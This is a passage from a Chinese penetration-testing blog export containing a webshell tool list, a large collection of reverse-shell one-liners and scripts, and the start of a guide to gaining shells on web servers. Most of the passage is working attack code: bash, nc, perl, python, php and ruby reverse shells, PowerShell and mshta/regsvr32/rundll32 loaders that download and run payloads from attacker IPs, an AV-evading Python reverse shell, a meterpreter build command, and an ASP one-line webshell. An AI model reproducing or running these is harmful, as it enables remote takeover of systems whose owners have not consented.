<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4029%23toc-20" target="_blank" rel="noopener">Upload-labs 20关通关笔记</a><br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2657%23toc-12" target="_blank" rel="noopener">Upload-labs之pass 16详细分析</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>Webshell和管理工具收集</title>
    <url>/2020/02/24/Webshell%E5%92%8C%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>本文主要为Webshell和Webshell管理工具收集，方便实战中渗透测试</p><h2 id="Webshell项目收集"><a href="#Webshell项目收集" class="headerlink" title="Webshell项目收集"></a>Webshell项目收集</h2><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p><a href="Https://github.com/sunge/Weevely" target="_blank" rel="noopener">Https://github.com/sunge/Weevely</a> kali自带的php强混淆工具，其他还自带</p><p><a href="https://github.com/xl7dev/WebShell" target="_blank" rel="noopener">https://github.com/xl7dev/WebShell</a></p><a id="more"></a>



<p><a href="https://github.com/tdifg/WebShell" target="_blank" rel="noopener">https://github.com/tdifg/WebShell</a></p>
<p><a href="https://github.com/testsecer/WebShell" target="_blank" rel="noopener">https://github.com/testsecer/WebShell</a></p>
<p><a href="https://github.com/lhlsec/webshell" target="_blank" rel="noopener">https://github.com/lhlsec/webshell</a></p>
<p><a href="https://github.com/liulongfei/web_shell_bopo" target="_blank" rel="noopener">https://github.com/liulongfei/web_shell_bopo</a> 一句话木马爆破工具</p>
<p><a href="https://github.com/L-codes/oneshellcrack" target="_blank" rel="noopener">https://github.com/L-codes/oneshellcrack</a> Webshell爆破</p>
<p><a href="https://github.com/Ni7eipr/webshell" target="_blank" rel="noopener">https://github.com/Ni7eipr/webshell</a></p>
<p><a href="https://github.com/Ettack/WebshellCCL" target="_blank" rel="noopener">https://github.com/Ettack/WebshellCCL</a> 辅助过安全狗</p>
<p><a href="https://github.com/webshellpub/awsome-webshell" target="_blank" rel="noopener">https://github.com/webshellpub/awsome-webshell</a></p>
<p><a href="https://github.com/wangeradd1/myWebShell" target="_blank" rel="noopener">https://github.com/wangeradd1/myWebShell</a> 一些比较冷门或者特殊的webshell脚本、jar包、war包</p>
<p><a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="noopener">https://github.com/tengzhangchao/PyCmd</a> 加密隐形一句话木马</p>
<h2 id="Webshell管理工具收集"><a href="#Webshell管理工具收集" class="headerlink" title="Webshell管理工具收集"></a>Webshell管理工具收集</h2><p><a href="https://github.com/0xHJK/caidao" target="_blank" rel="noopener">https://github.com/0xHJK/caidao</a> 中国菜刀</p>
<p><a href="https://github.com/alert0/webshellch" target="_blank" rel="noopener">https://github.com/alert0/webshellch</a> 中国菜刀JSP端</p>
<p><a href="https://github.com/raddyfiy/caidao-official-version" target="_blank" rel="noopener">https://github.com/raddyfiy/caidao-official-version</a> 中国菜刀</p>
<p><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a> 冰蝎</p>
<p><a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a> 蚁剑</p>
<p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a>  C刀</p>
<p><a href="https://github.com/keepwn/Altman" target="_blank" rel="noopener">https://github.com/keepwn/Altman</a> Altman3基于.Net4.0开发，支持Windows、Linux、Mac等多个平台</p>
<p><a href="https://github.com/Smaash/quasibot" target="_blank" rel="noopener">https://github.com/Smaash/quasibot</a> QuasiBot</p>
<p><a href="https://github.com/WangYihang/Webshell-Sniper" target="_blank" rel="noopener">https://github.com/WangYihang/Webshell-Sniper</a> Webshell-Sniper  仅支持uninx</p>
<p><a href="https://github.com/boy-hack/WebshellManager" target="_blank" rel="noopener">https://github.com/boy-hack/WebshellManager</a>  WebshellManager仅支持php</p>
<p>其他还有hatchet、K8飞刀、lanker、Xise等等</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/U38lR19fYK_2GocITS8PFg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/U38lR19fYK_2GocITS8PFg</a></p>
<p><a href="https://mp.weixin.qq.com/s/hPyy1Z7SP6DpF5vdpoPaGQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/hPyy1Z7SP6DpF5vdpoPaGQ</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell脚本收集</title>
    <url>/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>本文为反弹shell的脚本收集，使用nc作为监听。</p><p>nc安装：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"># set  netcat path</span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure><a id="more"></a>



<p>攻击机使用nc监听</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>-n: 不反向解析dns，即不通过ip解析域名 no dns</p>
<p>-v: 详细信息输出 verbose</p>
<p>-l:  监听 listen</p>
<p>-p: 指定端口 port</p>
<h2 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h2><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bash </span>-i &gt;&amp; /dev/tcp/攻击机<span class="built_in">ip</span>/攻击机port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>bash -i：交互式shell</p>
<p> &gt;&amp; :输入输出重定向：0 stdin, 1 stdout, 2 stderr</p>
<p>/dev/tcp/ip/port: 特殊文件</p>
<p><em>注: /dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</em></p>
<h3 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h3><p>攻击机监听端口：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">netcat:</span> nc -nvlp <span class="number">4444</span></span><br><span class="line"><span class="symbol">netcat:</span> nc -nvlp <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p>靶机telnet反弹shell</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">telnet</span> 攻击机<span class="built_in">ip</span> <span class="number">4444</span> <span class="title">| /bin/bash |</span> telnet 攻击机<span class="built_in">ip</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>

<p><em>注：bash进程的 0 ，1 ：stdin，stdout 标准输入输出描述符 都重定向到pipe，关联两个telnet进程，两个telnet进程分别与攻击机两个端口建立了socket连接</em></p>
<h3 id="nc（netcat）反弹"><a href="#nc（netcat）反弹" class="headerlink" title="nc（netcat）反弹"></a>nc（netcat）反弹</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">nc</span> -v 攻击机<span class="built_in">ip</span> <span class="number">4444</span> -e /<span class="keyword">bin/bash</span></span><br></pre></td></tr></table></figure>

<p>-e: 指定nc连接成功后执行的程序**</p>
<h3 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="攻击机ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span></span><br></pre></td></tr></table></figure>

<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>

<h3 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("攻击机ip",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>

<h3 id="Ruby反弹"><a href="#Ruby反弹" class="headerlink" title="Ruby反弹"></a>Ruby反弹</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>

<h3 id="Java反弹"><a href="#Java反弹" class="headerlink" title="Java反弹"></a>Java反弹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="powershell反弹cmd"><a href="#powershell反弹cmd" class="headerlink" title="powershell反弹cmd"></a>powershell反弹cmd</h3><p>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。<br>被攻击端运行命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>); powercat -c <span class="number">192.168</span>.<span class="number">1.4</span> -p <span class="number">9999</span> -e cmd</span><br></pre></td></tr></table></figure>

<p>攻击端用nc监听，即可反弹出cmd。</p>
<h3 id="powershell反弹powershell"><a href="#powershell反弹powershell" class="headerlink" title="powershell反弹powershell"></a>powershell反弹powershell</h3><p>使用nishang框架，有许多反弹脚本。</p>
<p> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsamratashok%2Fnishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a><br> 详情参考<br><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.52bug.cn%2Fhkjs%2F4585.html" target="_blank" rel="noopener">powershell反弹shell常见方式</a><br>被攻击端运行命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">203.140</span> -port <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p>攻击端用nc监听， 即可反弹出powershell。<br>注意某些特殊情况需要将powershell脚本进行base64编码，才能成功反弹。比如sqlserver的命令执行、php中system函数的执行</p>
<h4 id="base64编码处理"><a href="#base64编码处理" class="headerlink" title="base64编码处理"></a>base64编码处理</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$text</span>=<span class="string">"IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.203.140/a.ps1'))"</span></span><br><span class="line"><span class="variable">$Bytes</span>=[System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$Text</span>);<span class="variable">$EncodedText</span> =[Convert]::ToBase64String(<span class="variable">$Bytes</span>)</span><br><span class="line"><span class="variable">$EncodedText</span> &gt; bs64.txt</span><br></pre></td></tr></table></figure>

<p>将bs64.txt源码拷贝到下面命令，被攻击端运行即可。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -encodedcommand base64.txt</span><br></pre></td></tr></table></figure>

<p>攻击端用nc监听即可。</p>
<h3 id="python反弹cmd"><a href="#python反弹cmd" class="headerlink" title="python反弹cmd"></a>python反弹cmd</h3><p>可以用python编写反弹cmd的代码。参考大佬的代码改写而成，更简单使用一些。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveConnect</span><span class="params">(addr, port)</span>:</span></span><br><span class="line">    <span class="string">'''反弹连接shell'''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        shell.connect((addr,port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-] Failed to Create Socket : %s'</span>%reason)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    rlist = [shell]</span><br><span class="line">    wlist = []</span><br><span class="line">    elist = [shell]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        shell.send(<span class="string">"cmd:"</span>)</span><br><span class="line">        rs,ws,es = select.select(rlist,wlist,wlist)</span><br><span class="line">        <span class="keyword">for</span> sockfd <span class="keyword">in</span> rs:</span><br><span class="line">            <span class="keyword">if</span> sockfd == shell:</span><br><span class="line">                command = shell.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> command == <span class="string">'exit'</span>:</span><br><span class="line">                    shell.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result, error = subprocess.Popen(command,shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()</span><br><span class="line">                shell.sendall(result.decode(<span class="string">"GB2312"</span>).encode(<span class="string">"UTF-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数运行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">'Usage: python reverse.py [IP] [PORT]'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        ReserveConnect(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<p>考虑实战中可能没有python环境，可以先在本地上使用pyinstaller将改文件打包为exe文件，实战中直接上传exe运行即可。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">pythinstaller -Fw  <span class="built_in">reverse</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>被攻击端运行命令</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">reverse</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.203</span><span class="selector-class">.140</span> 4455</span><br></pre></td></tr></table></figure>

<p>攻击端用nc监听，即可反弹cmd。实际测试bypass av效果也比较好。</p>
<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-1.png" alt="ft-1"></p>
<p>参考大佬源代码<br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cnblogs.com%2FKevinGeorge%2Fp%2F9780151.html" target="_blank" rel="noopener">Windows下的shell原理</a></p>
<h3 id="dll反弹cmd"><a href="#dll反弹cmd" class="headerlink" title="dll反弹cmd"></a>dll反弹cmd</h3><p>来源t00ls</p>
<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-2.png" alt="ft-2"></p>
<p>将生成的dll文件上传至被攻击端。运行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regsvr32 /s /u server.dll</span><br></pre></td></tr></table></figure>

<p>攻击端用nc监听，即可反弹cmd。测试bypass av效果也不错</p>
<h3 id="mshta命令"><a href="#mshta命令" class="headerlink" title="mshta命令"></a>mshta命令</h3><p>运行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mshta http://47.94.80.xxx/payload.hta</span><br></pre></td></tr></table></figure>

<p>payload.hta 源码为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>)</span></span><br><span class="line"><span class="actionscript">objShell.Run <span class="string">"shellcode"</span> <span class="comment">//可以是exe、powershell</span></span></span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>shellcode为msf生成。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.80.xxx   LPORT=8080 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure>

<p>这里将木马改为powershell，且经过base64编码后的脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fileContent</span> = <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://47.94.80.xxx/ps/test.exe','D:\a.exe');start-process 'D:\a.exe'"</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$fileContent</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [System.Convert]::ToBase64String(<span class="variable">$bytes</span>);</span><br></pre></td></tr></table></figure>

<p>使用-enc再进行解码执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell  -enc  <span class="variable">$encoded</span></span><br></pre></td></tr></table></figure>

<p>可反弹shell</p>
<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-3.png" alt="ft-3"></p>
<h3 id="regsvr32命令"><a href="#regsvr32命令" class="headerlink" title="regsvr32命令"></a>regsvr32命令</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">regsvr32 /u /s /i:http:<span class="comment">//47.94.80.xxx/down.sct scrobj.dll</span></span><br></pre></td></tr></table></figure>

<p>down.sct源码为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">description</span>=<span class="string">"Test"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">"Test"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">version</span>=<span class="string">"1.00"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">"&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">            <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"powershell (new-object System.Net.WebClient).DownloadFile('http://47.94.80.xxx/ps/test.exe','D:\\a.exe');start-process 'D:\\a.exe'"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span></span><br><span class="line">    </span><br><span class="line">        ]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">public</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"Exec"</span>&gt;</span><span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">public</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Exec</span><span class="params">()</span></span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> r = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd.exe"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行后可反弹shell。</p>
<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-4.png" alt="ft-4"></p>
<h3 id="rundll32命令"><a href="#rundll32命令" class="headerlink" title="rundll32命令"></a>rundll32命令</h3><p>这里推荐MyJSRat<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRidter%2FMyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br> 下载后运行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python MyJSRat.py -i  <span class="number">144.34</span><span class="number">.184</span>.xxx -p  <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-5.png" alt="ft-5"></p>
<p>访问 Client Command</p>
<p>cmd运行</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;<span class="built_in">document</span>.write();h=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"GET"</span>,<span class="string">"http://144.34.184.2xx:8080/connect"</span>,<span class="literal">false</span>);<span class="keyword">try</span>&#123;h.Send();b=h.ResponseText;<span class="built_in">eval</span>(b);&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>即可获得shell。</p>
<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-6.png" alt="ft-6"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考链接中有非常多的姿势可以挖掘和学习</p>
<p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p>
<p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
<p><a href="https://www.jianshu.com/p/1a9ff74fee48" target="_blank" rel="noopener">https://www.jianshu.com/p/1a9ff74fee48</a></p>
<p><a href="https://www.jianshu.com/p/b12c79464521" target="_blank" rel="noopener">https://www.jianshu.com/p/b12c79464521</a></p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-从github下载文件的多种方法/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/</a></p>
<p><a href="http://www.52bug.cn/hkjs/4585.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4585.html</a></p>
<p><a href="https://www.secpulse.com/archives/44450.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/44450.html</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Getshell总结</title>
    <url>/2020/02/23/Getshell%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Getshell分为进管理员后台Getshell和不进后台Getshell，本文主要总结常见进后台Getshell和部分。</p><h2 id="进后台Getshell"><a href="#进后台Getshell" class="headerlink" title="进后台Getshell"></a>进后台Getshell</h2><h3 id="管理员后台直接Getshell"><a href="#管理员后台直接Getshell" class="headerlink" title="管理员后台直接Getshell"></a>管理员后台直接Getshell</h3><p>管理员后台直接上传Getshell，有时候带密码的Webshell连接时容易被waf拦截，可以上传不加密的Webshell如有权限限制可以尝试管理后台自带的修改文件名功能在文件名前加../来穿越目录，如上传的文件为a.php，将a.php修改为../a.php。</p><a id="more"></a>

<h3 id="后台数据库备份Getshell"><a href="#后台数据库备份Getshell" class="headerlink" title="后台数据库备份Getshell"></a>后台数据库备份Getshell</h3><p>后台数据库备份getshell，上传图片马并获取图片马路径，通过数据库备份修改后缀名，如有后缀名无法修改或路径无法修改限制可修改前端代码绕过，当所备份的数据库来源无法修改时，我们可以通过首先将一句话木马写入数据库，比如通过新建管理员用户，将用户名用一句话木马代替（用户名通常有长度限制，在前端修改maxlength即可），<code>&lt;%eval request (&quot;pass&quot;)%&gt;</code> 然后再通过备份数据库后访问此界面Getshell。</p>
<h3 id="各类上传Getshell"><a href="#各类上传Getshell" class="headerlink" title="各类上传Getshell"></a>各类上传Getshell</h3><p>参考本博上传绕过篇</p>
<h3 id="修改网站上传类型Getshell"><a href="#修改网站上传类型Getshell" class="headerlink" title="修改网站上传类型Getshell"></a>修改网站上传类型Getshell</h3><p>修改网站上传类型，后台设置中添加aasps|asp|php|jsp|aspx|asa|cer，保存后上传aasps文件，上传后为asp文件可以解析Getshll</p>
<h3 id="上传其他脚本类型Getshell"><a href="#上传其他脚本类型Getshell" class="headerlink" title="上传其他脚本类型Getshell"></a>上传其他脚本类型Getshell</h3><p>一台服务器有多个站，如a网站为asp脚本，b网站为php脚本，而a中限制了上传文件类型为asp的文件，此时可以上传php的脚本，来拿shell；也可以尝试脚本文件后缀名改为asa或者在后面直接加个.如xx.asp.来突破文件类型限制进行上传来Getshell</p>
<h3 id="解析漏洞Getshell"><a href="#解析漏洞Getshell" class="headerlink" title="解析漏洞Getshell"></a>解析漏洞Getshell</h3><h4 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h4><p><code>http://www.xxx.com/xx.asp/xx.jpg</code>，<code>http://www.xxx.com/xx.asp/xx.txt</code>，<code>http://www.xxx.com/xx.asp/xx.asp;jpg</code></p>
